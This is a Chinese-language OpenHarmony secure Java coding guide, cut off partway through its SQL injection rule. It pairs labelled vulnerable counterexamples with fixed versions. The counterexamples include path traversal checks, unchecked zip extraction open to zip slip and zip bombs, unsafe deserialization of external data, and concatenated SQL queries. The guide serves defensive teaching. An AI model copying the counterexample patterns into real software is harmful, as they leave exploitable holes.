# OpenHarmony Java 安全编程指南

本文档基于Java 语言提供一些安全编程建议，用于指导开发实践。

# 数据类型

## 进行数值运算时，避免整数溢出

**【描述】**

在进行数值运算过程中，确保运算结果在特定的整数类型的数据范围内，避免溢出，导致非预期的结果。

内置的整数运算符不会以任何方式来标识运算结果的上溢或下溢。常见的加、减、乘、除都可能会导致整数溢出。另外，Java数据类型的合法取值范围是不对称的（最小值的绝对值比最大值大1），所以对最小值取绝对值（`java.lang.Math.abs()`）时，也会导致溢出。

对于整数溢出问题，可以通过先决条件检测、使用Math类的安全方法、向上类型转换或者使用`BigInteger`等方法进行规避。

**【反例】**

```java
public static int multNum(int num1, int num2) {
    return num1 * num2;
}
```

上述示例中，当num1和num2的绝对值较大，两者的乘积大于`Integer.MAX_VALUE`或小于`Integer.MIN_VALUE`时，方法就无法返回正确的计算结果（产生溢出）。

**【正例】**

```java
public static int multNum(int num1, int num2) {
    return Math.multiplyExact(num1, num2);
}
```

上述示例中，当无法预判乘积结果是否会产生溢出时，使用了Java 8新增的`Math.multiplyExact()`方法，该方法在乘积运算不产生溢出时会返回运算结果，溢出时抛出`ArithmeticException`。

## 确保除法运算和模运算中的除数不为0

**【描述】**

如果除法或模运算中的除数为零可能会导致程序终止或拒绝服务（DoS），因此需要在运算前保证除数不为0。

**【反例】**

```java
long dividendNum = 0;
long divisorNum = 0;
long result1 = dividendNum / divisorNum;
long result2 = dividendNum % divisorNum;
```

上述示例中，没有对除数进行非零判断，会导致程序运行错误。

**【正例】**

```java
long dividendNum = 0;
long divisorNum = 0;
if (divisorNum != 0) {
    long result1 = dividendNum / divisorNum;
    long result2 = dividendNum % divisorNum;
}
```

上述示例中，对除数进行非零判断，然后再进行除法或取余运算。

# 表达式

## 禁止直接使用可能为null的对象，防止出现空指针引用

**【描述】**

访问一个为null的对象时，会导致空引用问题，代码中抛出`NullPointerException`。该类问题应该通过预检查的方式进行消解，而不是通过`try...catch`机制处理`NullPointerException`。

**【反例】**

```java
String env = System.getenv(SOME_ENV);
if (env.length() > MAX_LENGTH) {
    ...
}
```

上述示例中，`System.getenv()`返回值可能为null，代码中在使用变量`env`前未判空，会发生空指针引用。

**【正例】**

```java
String env = System.getenv(SOME_ENV);
if (env != null && env.length() > MAX_LENGTH) {
    ...
}
```

上述示例中，对`System.getenv()`返回值先判空再使用，消除了空指针引用问题。

# 并发与多线程

## 在异常条件下，保证释放已持有的锁

**【描述】**

一个线程中没有正确释放持有的锁会导致其他线程无法获取该锁对象，导致阻塞。在发生异常时，需要确保程序正确释放当前持有的锁。在异常条件下，同步方法或者块同步中使用的对象内置锁会自动释放。但是大多数的Java锁对象并不是Closeable，无法使用try-with-resources功能自动释放，在这种情况下需要主动释放锁。

**【反例】**（可检查异常）

```java
public final class Foo {
    private final Lock lock = new ReentrantLock();

    public void incorrectReleaseLock() {
        try {
            lock.lock();
            doSomething();
            lock.unlock();
        } catch (MyBizException ex) {
            // 处理异常
        }
    }

    private void doSomething() throws MyBizException {
        ...
    }
}
```

上述代码示例中，使用了`ReentrantLock`锁，当`doSomething()`方法抛出异常时，catch代码块中没有释放锁操作，导致锁没有释放。

**【正例】**（finally代码块）

```java
public final class Foo {
    private final Lock lock = new ReentrantLock();

    public void correctReleaseLock() {
        lock.lock();
        try {
            doSomething();
        } catch (MyBizException ex) {
            // 处理异常
        } finally {
            lock.unlock();
        }
    }

    private void doSomething() throws MyBizException {
        ...
    }
}
```

上述代码示例中，成功执行锁定操作后，将可能抛出异常的操作封装在try代码块中。锁在执行try代码块前获取，可保证在执行finally代码时正确持有锁。在finally代码块中调用`lock.unlock()`，可以保证不管是否发生异常都可以释放锁。

**【反例】**（未检查异常）

```java
final class Foo {
    private final Lock lock = new ReentrantLock();

    public void incorrectReleaseLock(String value) {
        lock.lock();
        ...
        int index = Integer.parseInt(value);
        ...
        lock.unlock();
    }
}
```

上述代码示例中，当`incorrectReleaseLock()`方法传入的String不是数字时，后续的操作会抛出`NumberFormatException`，导致锁未被正确释放。

**【正例】**（finally代码块）

```java
final class Foo {
    private final Lock lock = new ReentrantLock();

    public void correctReleaseLock(String value) {
        lock.lock();
        try {
            ...
            int index = Integer.parseInt(value);
            ...
        } finally {
            lock.unlock();
        }
    }
}
```

上述代码示例中，成功执行锁定操作后，将可能抛出异常的操作封装在try代码块中。锁在执行try代码块前获取，可保证在执行finally代码时正确持有锁。在finally代码块中调用`lock.unlock()`，可以保证不管是否发生异常都可以释放锁。

## 禁止使用Thread.stop()来终止线程

**【描述】**

线程在正常退出时，会维持类的不变性。某些线程API最初是用来帮助线程的暂停、恢复和终止，但随后因为设计上的缺陷而被废弃。例如，`Thread.stop()`方法会导致线程立即抛出一个`ThreadDeath`异常，这通常会停止线程。调用`Thread.stop()`会造成一个线程非正常释放它所获得的所有锁，可能会暴露这些锁保护的对象，使这些对象处于一个不一致的状态中。

**【反例】**（使用废弃的Thread.stop()）

```java
public final class Foo implements Runnable {
    private final Vector<Integer> vector = new Vector<Integer>(1000);

    public Vector<Integer> getVector() {
        return vector;
    }

    @Override
    public synchronized void run() {
        Random number = new Random(123L);
        int i = vector.capacity();
        while (i > 0) {
            vector.add(number.nextInt(100));
            i--;
        }
    }

    public static void main(String[] args) throws InterruptedException {
        Thread thread = new Thread(new Foo());
        thread.start();
        Thread.sleep(5000);
        thread.stop();
    }
}
```

上述示例中，一个线程将伪随机数写入一个vector中，在经过指定时间后，线程被强迫终止。因为Vector是线程安全的，所以多个线程对共享实例进行的操作是不会让其处于一个不一致的状态。例如，`Vector.size()`方法总是能返回vector中的元素的正确数目。Vector实例是使用自身的隐式锁来保持同步。而`Thread.stop()`方法会导致线程停止在正在进行的操作并抛出`ThreadDeath`异常，所有获得的锁会被释放，如果线程是在加入一个新整数到vector时被停止的，就可能导致处于不一致状态的vector，如因为元素数目是在添加一个元素后增加的，可能会导致`Vector.size()`返回的是错误的元素数目。

**【正例】**（设置线程结束标志）

```java
public final class Foo implements Runnable {
    private final Vector<Integer> vector = new Vector<Integer>(1000);

    private boolean done = false;

    public Vector<Integer> getVector() {
        return vector;
    }

    public void shutdown() {
        done = true;
    }

    @Override
    public synchronized void run() {
        Random number = new Random(123L);
        int i = vector.capacity();
        while (!done && i > 0) {
            vector.add(number.nextInt(100));
            i--;
        }
    }

    public static void main(String[] args) throws InterruptedException {
        Foo foo = new Foo();
        Thread thread = new Thread(foo);
        thread.start();
        Thread.sleep(5000);
        foo.shutdown();
    }
}
```

上述示例中，使用一个标志来请求线程终止。`shutdown()`方法设置这个标志为true，线程的`run()`方法查询该标志为true时终止执行。

**【正例】**（可中断）

```java
public final class Foo implements Runnable {
    private final Vector<Integer> vector = new Vector<Integer>(1000);

    public Vector<Integer> getVector() {
        return vector;
    }

    @Override
    public synchronized void run() {
        Random number = new Random(123L);
        int i = vector.capacity();
        while (!Thread.interrupted() && i > 0) {
            vector.add(number.nextInt(100));
            i--;
        }
    }

    public static void main(String[] args) throws InterruptedException {
        Foo foo = new Foo();
        Thread thread = new Thread(foo);
        thread.start();
        Thread.sleep(5000);
        thread.interrupt();
    }
}
```

上述示例中，调用`Thread.interrupt()`方法来终止线程。调用`Thread.interrupt()`方法设置了一个内部的中断标志。线程可以通过`Thread.interrupted()`方法来检查该标志，该方法会在当前线程被中断时返回true，并会清除该中断标志。

## 线程池中的线程结束后必须清理自定义的ThreadLocal变量

**【描述】**

线程池技术通过重复使用线程以减少线程创建开销。由于线程的复用，导致`ThreadLocal`变量的使用存在以下两类问题：

- 脏数据问题：当前任务未正确初始化`ThreadLocal`变量，导致`ThreadLocal`变量是由该线程执行的其他任务设置的；
- 内存泄露问题：`ThreadLocal`变量未主动释放，导致内存无法被主动回收。

因此必须保证线程池中每个任务使用的`ThreadLocal`变量在任务结束后被主动清理。

**【正例】**

```java
public class TestThreadLocal {
    public static void main(String[] args) {
        ThreadPoolExecutor pool = new ThreadPoolExecutor(1, 2, 100,
            TimeUnit.MILLISECONDS, new LinkedBlockingQueue<Runnable>(),
            Executors.defaultThreadFactory(), new ThreadPoolExecutor.CallerRunsPolicy());
        for (int i = 0; i < 20; i++) {
            pool.execute(new TestThreadLocalTask());
        }
    }
}

class TestThreadLocalTask implements Runnable {
    private static ThreadLocal<Integer> localValue = new ThreadLocal<>();

    @Override
    public void run() {
        localValue.set(STATE1);
        try {
            ...
            localValue.set(STATE3);
            ...
        } finally {
            localValue.remove(); // 需要执行remove方法清理线程局部变量，避免内存泄露
        }
    }
}
```

# 输入输出

## 在多用户系统中创建文件时指定合适的访问许可

**【描述】**

多用户系统中的文件通常归属于一个特定的用户，文件的属主能够指定系统中哪些用户能够访问该文件的内容。这些文件系统使用权限和许可模型来保护文件访问。当一个文件被创建时，文件访问许可规定了哪些用户可以访问或者操作这个文件。如果创建文件时没有对文件的访问许可做足够的限制，攻击者可能在修改此文件的访问权限之前对其进行读取或者修改。因此，一定要在创建文件时就为其指定访问许可，以防止未授权的文件访问。

**【反例】**

```java
Writer out = new FileWriter("file");
```

`FileOutputStream`与`FileWriter`的构造方法无法让程序员显式的指定文件的访问权限。在这个示例中，所创建文件的访问许可取决于具体的实现机制，可能无法防止未授权的访问。

**【正例】**

```java
Path file = new File("file").toPath();

// 抛出异常而不是覆写已存在的文件
Set<OpenOption> options = new HashSet<OpenOption>();
options.add(StandardOpenOption.CREATE_NEW);
options.add(StandardOpenOption.APPEND);

// 文件权限应设置为只有属主才能读取/写入文件
Set<PosixFilePermission> perms = PosixFilePermissions.fromString("rw-------");
FileAttribute<Set<PosixFilePermission>> attr =
    PosixFilePermissions.asFileAttribute(perms);
try (SeekableByteChannel sbc = Files.newByteChannel(file, options, attr)) {
    ... // 写数据
}
```

**【例外】**

如果文件是创建在一个安全目录中，而且该目录对于非受信用户是不可读的，那么允许以默认许可创建文件。例如，如果整个文件系统是可信的或者只有可信用户可以访问，就属于这种情况。

## 使用外部数据构造的文件路径前必须进行校验，校验前必须对文件路径进行规范化处理

**【描述】**

文件路径来自外部数据时，必须对其合法性进行校验，否则可能会产生路径遍历（Path Traversal）漏洞。

文件路径有多种表现形式，如绝对路径、相对路径，路径中可能会含各种链接、快捷方式、影子文件等，这些都会对文件路径的校验产生影响，所以在文件路径校验前要对文件路径进行规范化处理，使用规范化的文件路径进行校验。对文件路径的规范化处理必须使用`getCanonicalPath()`，禁止使用`getAbsolutePath()`（该方法无法保证在所有的平台上对文件路径进行正确的规范化处理）。

**【反例】**

```java
public void doSomething() {
    File file = new File(HOME_PATH, fileName);
    String path = file.getPath();

    if (!validatePath(path)) {
        throw new IllegalArgumentException("Path Traversal vulnerabilities may exist！");
    }
    ... // 对文件进行读写等操作
}

private boolean validatePath(String path) {
    if (path.startsWith(HOME_PATH)) {
        return true;
    } else {
        return false;
    }
}
```

上述代码中fileName来自外部输入，直接用fileName的值与固定路径进行拼接，作为实际访问文件的路径，在访问文件之前通过`validatePath`检查了拼接的路径是否在固定目录下，但是攻击者可以通过../这样的路径方式，访问HOME_PATH之外的任意文件。

**【正例】**（getCanonicalPath()）

```java
public void doSomething() {
    File file = new File(HOME_PATH, fileName);
    try {
        String canonicalPath = file.getCanonicalPath();
        if (!validatePath(canonicalPath)) {
            throw new IllegalArgumentException("Path Traversal vulnerability!");
        }
        ... // 对文件进行读写等操作
    } catch (IOException ex) {
        throw new IllegalArgumentException("An exception occurred ...", ex);
    }
}

private boolean validatePath(String path) {
    if (path.startsWith(HOME_PATH)) {
        return true;
    } else {
        return false;
    }
}
```

上述代码示例中，使用外部输入的fileName构造文件路径后，先对文件路径进行规范化，然后用规范化的文件路径进行校验，满足条件后执行文件读写操作。这样可以有效避免路径遍历之类的风险。

## 从ZipInputStream中解压文件必须进行安全检查

**【描述】**

使用`java.util.zip.ZipInputStream`解压文件时，有两个问题需要注意：

**1. 解压出的文件在解压目标目录之外**

解压zip文件时要校验各解压文件的名字，如果文件名包含../会导致解压文件被释放到目标目录之外的目录。因此，任何被解压文件的目标路径不在预期目录之内时，要么拒绝将其解压出来，要么将其解压到一个安全的位置。

**2. 解压的文件消耗过多的系统资源**

解压zip时，不仅要对解压之后的文件数量进行限制，还要对解压之后的文件大小进行限制。zip压缩算法可能有很大的压缩比，可以把超大文件压缩成很小的zip文件。zip文件解压时，如果不对解压后的文件的实际大小进行检查，则可能会使解压后的文件占用大量系统资源，导致zip炸弹（zip bomb）攻击。因此，Zip文件解压时，若解压之后的文件大小超过一定的限制，必须拒绝将其解压。具体大小限制由平台的处理性能来决定。

**【反例】**

```java
public void unzip(String fileName, String dir) throws IOException {
    try (FileInputStream fis = new FileInputStream(fileName);
        ZipInputStream zis = new ZipInputStream(fis)) {
        ZipEntry entry;
        File tempFile;
        byte[] buf = new byte[10240];
        int length;

        while ((entry = zis.getNextEntry()) != null) {
            tempFile = new File(dir, entry.getName());
            if (entry.isDirectory()) {
                tempFile.mkdirs();
                continue;
            }

            try (FileOutputStream fos = new FileOutputStream(tempFile)) {
                while ((length = zis.read(buf)) != -1) {
                    fos.write(buf, 0, length);
                }
            }
        }
    }
}
```

上述示例中，未对解压的文件名做验证，直接将文件名传递给`FileOutputStream`构造器。也未检查解压文件的资源消耗情况，允许程序运行到操作完成或者本地资源被耗尽。

**【正例】**

```java
private static final long MAX_FILE_COUNT = 100L;
private static final long MAX_TOTAL_FILE_SIZE = 1024L * 1024L;

...

public void unzip(FileInputStream zipFileInputStream, String dir) throws IOException {
    long fileCount = 0;
    long totalFileSize = 0;

    try (ZipInputStream zis = new ZipInputStream(zipFileInputStream)) {
        ZipEntry entry;
        String entryName;
        String entryFilePath;
        File entryFile;
        byte[] buf = new byte[10240];
        int length;

        while ((entry = zis.getNextEntry()) != null) {
            entryName = entry.getName();
            entryFilePath = sanitizeFileName(entryName, dir);
            entryFile = new File(entryFilePath);

            if (entry.isDirectory()) {
                creatDir(entryFile);
                continue;
            }

            fileCount++;
            if (fileCount > MAX_FILE_COUNT) {
                throw new IOException("The ZIP package contains too many files.");
            }

            try (FileOutputStream fos = new FileOutputStream(entryFile)) {
                while ((length = zis.read(buf)) != -1) {
                    totalFileSize += length;
                    zipBombCheck(totalFileSize);
                    fos.write(buf, 0, length);
                }
            }
        }
    }
}

private String sanitizeFileName(String fileName, String dir) throws IOException {
    File file = new File(dir, fileName);
    String canonicalPath = file.getCanonicalPath();
    if (canonicalPath.startsWith(dir)) {
        return canonicalPath;
    }
    throw new IOException("Path Traversal vulnerability: ...");
}

private void creatDir(File dirPath) throws IOException {
    boolean result = dirPath.mkdirs();
    if (!result) {
        throw new IOException("Create dir failed, path is : " + dirPath.getPath());
    }
    ...
}

private void zipBombCheck(long totalFileSize) throws IOException {
    if (totalFileSize > MAX_TOTAL_FILE_SIZEG) {
        throw new IOException("Zip Bomb! The size of the file extracted from the ZIP package is too large.");
    }
}
```

上述示例中，在解压每个文件之前对其文件名进行校验，如果校验失败，整个解压过程会被终止。实际上也可以忽略跳过这个文件，继续后面的解压过程，甚至可以将这个文件解压到某个安全位置。解压缩过程中，在while循环中边读边统计实际解压出的文件总大小，如果达到指定的阈值（MAX_TOTAL_FILE_SIZE），会抛出异常终止解压操作；同时，会统计解压出来的文件的数量，如果达到指定阈值（MAX_FILE_COUNT），会抛出异常终止解压操作。

说明：在统计解压文件的大小时，不应该使用`entry.getSize()`来统计文件大小，`entry.getSize()`是从zip文件中的固定字段中读取单个文件压缩前的大小，文件压缩前的大小可被恶意篡改。

## 对于从流中读取一个字符或字节的方法，使用int类型的返回值

**【描述】**

Java中`InputStream.read()`和`Reader.read()`方法用于从流中读取一个字节（byte）或字符（char）。

`InputStream.read()`读取一个字节，返回值的范围为0x00-0xFF（补码），8位；`Reader.read()`读取一个字符，返回值的范围为0x0000-0xFFFF（补码），16位。

当读取到流的末尾时，以上方法均返回int类型的-1（补码表示为0xFFFFFFFF），32位。

因此，如果在未判断返回值是否是流末尾标志-1（补码表示为0xFFFFFFFF）前将返回值转为byte或char，会导致无法正确判断返回值是流中的内容还是结束标识。

**【反例】**（字节）

```java
FileInputStream in = getReadableStream();

byte data;
while ((data = (byte) in.read()) != -1) {
    // 使用data
    ...
}
```

上述代码中，将`read()`方法返回的值直接转换为byte类型，并将转换后的结果与-1进行比较，进而判断是否达到流的末尾。如果`read()`返回值为0xFF，0xFF转为有符号byte即为byte类型-1，循环结束条件判断通过，结果就是错误的以为流结束了。

**【反例】**（字符）

```java
InputStreamReader in = getReader();

char data;
while ((data = (char) in.read()) != -1) {
    // 使用data
    ...
}
```

上述代码中，将`read()`方法返回的值直接转换为char类型，并将转换后的结果与-1进行比较，进而判断是否达到流的末尾。当读取流结束后，返回值转为char类型后也不为-1，因此即使流读取结束，while循环仍无法正确终止。
原因是流结束标志-1（补码表示为0xFFFFFFFF）被强转为char类型时，会被转为0xFFFF，再和-1进行比较时等式不成立，导致循环结束条件永假。

**【正例】**（字节）

```java
FileInputStream in = getReadableStream();

byte data;
int result;
while ((result = in.read()) != -1) {
    data = (byte) result;
    // 使用data
    ...
}
```

**【正例】**（字符）

```java
InputStreamReader in = getReader();

char data;
int result;
while ((result = in.read()) != -1) {
    data = (char) result;
    // 使用data
    ...
}
```

上述代码中，使用int类型的变量来保存`read()`的返回值，并使用该返回值判断是否读取到流的末尾，流未读完时，将读取的内容转换为char或者byte类型，这样就避免了判断流末尾不准确。

## 防止外部进程阻塞在输入输出流上

**【描述】**

Java中有两种方式启动一个外部进程并与其交互：

1. java.lang.Runtime的exec()方法
2. java.lang.ProcessBuilder的start()方法

他们都返回一个java.lang.Process对象，该对象封装了这个外部进程。

每个Process对象，包含输入流、输出流及错误流各一个，应该恰当地处理这些流，避免外部进程阻塞在这些流上。

不正确的处理会产生异常、DoS，及其他安全问题。

1、处理外部进程的输入流（`Process.getOutputStream()`，**从调用者角度来说，外部进程的输入流是OutputStream**）：
对于需要输入流的外部进程，如果不为其提供一个有效输入，则其会从一个空的输入流中读取输入，导致其一直阻塞。

2、处理外部进程的输出流（`Process.getInputStream()`）和错误流（`Process.getErrorStream()`）：
对于有输出流和错误流的外部进程，如果调用者不处理并且清空对应流，则该外部进程的输出可能会耗尽该进程输出流与错误流的缓冲区，导致外部进程被调用者阻塞，并影响调用者与外部进程的正常交互。
如果使用`java.lang.ProcessBuilder`来调用外部进程，那么外部进程错误流可以通过`redirectErrorStream()`方法重定向到其输出流，调用者可以通过处理并清空输出流来同时处理错误流。

**【反例】**（错误处理外部进程的返回结果）

```java
public void execExtProcess() throws IOException {
    Process proc = Runtime.getRuntime().exec("ProcessMaybeStillRunning");
    int exitVal = proc.exitValue();
}
```

上述示例中，程序未等到ProcessMaybeStillRunning进程结束就调用`exitValue()`方法，很可能会导致`IllegalThreadStateException`异常。

**【反例】**（未处理外部进程的输出流、错误流）

```java
public void execExtProcess() throws IOException, InterruptedException {
    Process proc = Runtime.getRuntime().exec("ProcessMaybeStillRunning");
    int exitVal = proc.waitFor();
}
```

此示例对比上一个示例，不会产生`IllegalThreadStateException`异常。但是由于没有处理ProcessMaybeStillRunning的输出流和错误流，可能会导致描述中列出的问题。

**【正例】**

```java
public class ProcessExecutor {
    public void callExtProcess() throws IOException, InterruptedException {
        Process proc = Runtime.getRuntime().exec("ProcessHasOutput");

        StreamConsumer errConsumer = new StreamConsumer(proc.getErrorStream());
        StreamConsumer outputConsumer = new StreamConsumer(proc.getInputStream());

        errConsumer.start();
        outputConsumer.start();

        int exitVal = proc.waitFor();

        errConsumer.join();
        outputConsumer.join();
    }

    class StreamConsumer extends Thread {
        InputStream is;

        StreamConsumer(InputStream is) {
            this.is = is;
        }

        @Override
        public void run() {
            try {
                byte data;
                int result;
                while ((result = is.read()) != -1) {
                    data = (byte) result;
                    handleData(data);
                }
            } catch (IOException ex) {
                // 处理异常
            }
        }

        private void handleData(byte data) {
            ...
        }
    }
}
```

上述示例产生两个线程来分别读取进程的输出流和错误流。因此，外部进程将不会无限期地阻塞在这些流之上。

**【例外】**

对于外部进程不涉及使用输入流、输出流和错误流的场景，可以不对流进行专门处理。

## 临时文件使用完毕必须及时删除

**【描述】**

程序中很多用到临时文件的地方，比如用于进程间的数据共享，缓存内存数据，动态构造的类文件，动态连接库文件等。临时文件可能创建于操作系统的共享临时文件目录。这类目录中的文件可能会被定期清理，例如，每天晚上或者重启时。然而，如果文件未被安全地创建或者用完后还是可访问的，具备本地文件系统访问权限的攻击者便可以利用共享目录中的文件进行恶意操作。删除已经不再需要的临时文件有助于对文件名和其他资源（如二级存储）进行回收利用。每一个程序在正常运行过程中都有责任确保已使用完毕的临时文件被删除。

**【反例】**

```java
public boolean uploadFile(InputStream in) throws IOException {
    File tempFile = File.createTempFile("tempname", ".tmp");
    try (FileOutputStream fop = new FileOutputStream(tempFile)) {
        int readSize;
        do {
            readSize = in.read(buffer, 0, MAX_BUFF_SIZE);
            if (readSize > 0) {
                fop.write(buffer, 0, readSize);
            }
        } while (readSize >= 0);
        ... // 对tempFile进行其他操作
    }
}
```

上述示例代码在运行结束时未将临时文件删除。

**【正例】**

```java
public boolean uploadFile(InputStream in) throws IOException {
    File tempFile = File.createTempFile("tempname", ".tmp");
    try (FileOutputStream fop = new FileOutputStream(tempFile)) {
        int readSize;
        do {
            readSize = in.read(buffer, 0, MAX_BUFF_SIZE);
            if (readSize > 0) {
                fop.write(buffer, 0, readSize);
            }
        } while (readSize >= 0);
        ... // 对tempFile进行其他操作
    } finally {
        if (!tempFile.delete()) {
            // 忽略
        }
    }
}
```

以上例子，在临时文件使用完毕之后，finally语句里对其进行了彻底删除。

# 序列化

#### 禁止直接将外部数据进行反序列化

**【描述】**

反序列化操作是将一个二进制流或字符串反序列化为一个Java对象。当反序列化操作的数据是外部数据时，恶意用户可利用反序列化操作构造指定的对象、执行恶意代码、向应用程序中注入有害数据等。不安全反序列化操作可能导致任意代码执行、特权提升、任意文件访问、拒绝服务等攻击。

实际应用中，通常采用三方件实现对json、xml、yaml格式的数据序列化和反序列化操作。常用的三方件包括：fastjson、jackson、XMLDecoder、XStream、SnakeYmal等。

**【反例】**

```java
public class DeserializeExample implements Serializable {
    private static final long serialVersionUID = -5809782578272943999L;

    private String name;

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    private void readObject(java.io.ObjectInputStream ois) {
        ois.defaultReadObject();
        System.out.println("Hack!");
    }
}

    // 使用外部数据执行反序列化操作
    ObjectInputStream ois2= new ObjectInputStream(fis);
    PersonInfo myPerson = (PersonInfo) ois2.readObject();
```

上面的示例中，当反序列化操作的对象是攻击者构造的DeserializeExample对象的序列化结果，当`PersonInfo myPerson = (PersonInfo) ois2.readObject()`该语句执行时会报错，但是DeserializeExample对象中的`readObject()`方法中的攻击代码已经被执行。

**【正例】**（使用白名单校验）

```java
public final class SecureObjectInputStream extends ObjectInputStream {
    public SecureObjectInputStream() throws SecurityException, IOException {
        super();
    }

    public SecureObjectInputStream(InputStream in) throws IOException {
        super(in);
    }

    protected Class<?> resolveClass(ObjectStreamClass desc)
        throws IOException, ClassNotFoundException {
        if (!desc.getName().equals("com.xxxx.PersonInfo")) { // 白名单校验
            throw new ClassNotFoundException(desc.getName() + " not find");
        }
        return super.resolveClass(desc);
    }
}
```

上述示例是对反序列化的类进行白名单检查。即在自定义ObjectInputStream中重载`resolveClass()`方法，对className进行白名单校验。如果反序列化的类不在白名单之中，直接抛出异常。

**【正例】**（使用安全管理器防护）

如果产品已经使用Java的安全管理器，建议使用Java安全管理器机制进行防护。

(1) 设置enableSubclassImplementation

```
permission java.io.SerializablePermission "enableSubclassImplementation";

```

(2) 定义ObjectInputStream，重载resolveClass的方法

```java
public final class HWObjectInputStream extends ObjectInputStream {
    public HWObjectInputStream() throws SecurityException, IOException {
        super();
    }

    public HWObjectInputStream(InputStream in) throws IOException {
        super(in);
    }

    protected Class<?> resolveClass(ObjectStreamClass desc)
        throws IOException, ClassNotFoundException {
        SecurityManager sm = System.getSecurityManager();
        if (sm != null) {
            sm.checkPermission(new SerializablePermission(
                "com.xxxx." + desc.getName()));
        }
        return super.resolveClass(desc);
    }
}
```

(3) 在policy文件里设置白名单

```
permission java.io.SerializablePermission "com.xxxx.PersonInfo";

```

# 外部数据校验

## 外部数据使用前必须进行合法性校验

**描述】**

外部数据的范围包括但不限于：网络、用户输入（包括命令行、界面）、命令行、文件（包括程序的配置文件） 、环境变量、进程间通信（包括管道、消息、共享内存、socket等、RPC）、跨信任域方法参数（对于API）等。

来自程序外部的数据通常被认为是不可信的，在使用这些数据前需要进行合法性校验，否则可能会导致不正确的计算结果、运行时异常、不一致的对象状态，甚至引起各种注入攻击，对系统造成严重影响。

**对外部数据的校验包括但不局限于：**

- 校验API接口参数合法性；
- 校验数据长度；
- 校验数据范围；
- 校验数据类型和格式；
- 校验集合大小；
- 校验外部数据只包含可接受的字符（白名单校验），尤其需要注意一些特殊情况下的特殊字符。

对于外部数据的校验，要注意以下两点：

- 如果需要，外部数据校验前要先进行标准化：例如“\uFE64”、“<”都可以表示“<”，在web应用中，如果外部输入不做标准化，可以通过“\uFE64”绕过对“<”限制。
- 对外部数据的修改要在校验前完成，保证实际使用的数据与校验的数据一致。

出于性能和代码简洁性考虑，对于RESTful API，provider只校验请求信息，consumer只校验响应结果；对于一个调用链上的方法，最外层的对外public方法必须校验，内部public方法可不重复校验。

**常见校验框架：**

接口：JSR 380（Bean Validation 2.0）、JSR 303（Bean Validation 1.0）JavaBean参数校验标准，核心接口javax.validation.Validator，定义了很多常用的校验注解。
实现：hibernate-validator 、Spring：

- hibernate-validator 是 JSR 380（Bean Validation 2.0）、JSR 303（Bean Validation 1.0）规范的实现，同时扩展了注解：@Email、@Length、@NotEmpty、@Range等。
- Spring validator 同样实现了JSR 380和JSR 303，并提供了MethodValidationPostProcessor类，用于对方法的校验。

产品可自主选择合适的校验框架，也可以自主开发实现外部数据校验。

**【反例】**

```java
/**
 * 更换公司信息
 *
 * @param companies 新旧公司信息
 * @return 更换公司是否成功
 */
@RequestMapping(value = "/updating", method = RequestMethod.POST)
public boolean updateCompany(@RequestBody Companies companies) {
    return employeeService.updateCompany(companies.getSrcCompany(),
        companies.getDestCompany());
}
```

上面的错误代码，provider对外开放的`updateCompany()`接口未对请求体做校验，存在被恶意攻击的风险。

**【正例】**

```java
/**
 * 更换公司信息
 *
 * @param companies 新旧公司信息
 * @return 更换公司是否成功
 */
@RequestMapping(value = "/updating", method = RequestMethod.POST)
public boolean updateCompany(@RequestBody @Valid @NotNull Companies companies) {
    return employeeService.updateCompany(
        companies.getSrcCompany(), companies.getDestCompany());
}

@Setter
@Getter
public class Companies {
    @Valid
    @NotNull
    private Company srcCompany;

    @Valid
    @NotNull
    private Company destCompany;
}

@Setter
@Getter
@Accessors(chain = true)
public class Company {
    @NotBlank
    @Size(min = 10, max = 256)
    private String name;

    @NotBlank
    @Size(min = 10, max = 512)
    private String address;

    @Valid
    private SubCompany subCompany;
}
```

上述示例使用@Valid注解触发参数校验，校验逻辑为对象属性声明时通过注解指定的规则。对外接口内部调用的public方法`employeeService.updateCompany()`由于只有本模块使用，非对外接口，而且调用的地方已做参数校验，可以不做参数判断。

**【反例】**

获取环境变量值后未校验，直接使用。

```java
public static String getFile(String filePath, String fileName) {
    // 获取进程的classpath路径
    String path = System.getProperty(RUNTIME_BASE_DIR);
    ... // 直接使用
}
```

**【正例】**

使用ClassLoader提供的`getResource()`和`getResourceAsStream()`从装载的类路径中取得资源。

```java
public static String getSavePath(String filePath, String fileName) {
    return ClassLoader.getSystemResource(fileName).getPath();
}
```

对环境变量的值先进行标准化处理，再执行校验，最后使用：

```java
public static String getFile(String filePath, String fileName) {
    // 获取进程的classpath路径
    String path = System.getProperty(RUNTIME_BASE_DIR);

    // 标准化
    // 校验，例如StringUtils.startsWith(path, "/opt/xxxx/release/");
    // 使用
}
```

**【反例】**

配置文件未校验，直接使用。

```java
@Configuration
@PropertySource("classpath:xxx.properties")
@Component
public class XxxConfig {
    @Value("${appId}")
    private String appId;

    @Value("${secret}")
    private String citySecret;
}
```

**【正例】**

Spring Boot框架可以使用注解@ConfigurationProperties和@Validated完成对配置文件的校验，如下所示：

```java
@ConfigurationProperties(locations = "classpath: xxx.properties", prefix = "xxx")
@Validated
public class XxxConfig {
    @Value("${appId}")
    @Pattern(regexp = "[0-9_A-Z]{32}")
    private String appId;

    @Value("${secret}")
    @Pattern(regexp = "[0-9A-Z]{64,138}", message = "Authentication credential error!")
    private String citySecret;

    // Setter和Getter方法
}
```

ServiceComb框架，可以通过Java自带的validation-api，从Bean上下文取到配置文件对象后，显式调用检验。             

## 禁止直接使用外部数据来拼接SQL语句

**【描述】**

SQL注入是指使用外部数据构造的SQL语句所代表的数据库操作与预期不符，这样可能会导致信息泄露或者数据被篡改。SQL注入产生的根本原因是使用外部数据直接拼接SQL语句，防护措施主要有以下三类：

- 使用参数化查询：最有效的防护手段，但对SQL语句中的表名、字段名等不适用；
- 对外部数据进行白名单校验：适用于拼接SQL语句中的表名、字段名；
- 对外部数据中的与SQL注入相关的特殊字符进行转义：适用于必须通过字符串拼接构造SQL语句的场景，转义仅对由引号限制的字段有效。

参数化查询是一种简单有效的防止SQL注入的查询方式，应该被优先考虑使用。另外，参数化查询还能提高数据库访问的性能，例如，SQL Server与Oracle数据库会为其缓存一个查询计划，以便在后续重复执行相同的查询语句时无需编译而直接使用。对于常用的ORM框架（如Hibernate、iBATIS等），同样支持参数化查询。

**【反例】**（Java代码动态构建SQL）

```java
Statement stmt = null;
ResultSet rs = null;
try {
    String userName = request.getParameter("name");
    String password = request.getParameter("password");
    ...
    String sqlStr = "SELECT * FROM t_user_info WHERE name = '" + userName
        + "' AND password = '" + password + "'";
    stmt = connection.createStatement();
    rs = stmt.executeQuery(sqlString);
    ... // 结果集处理
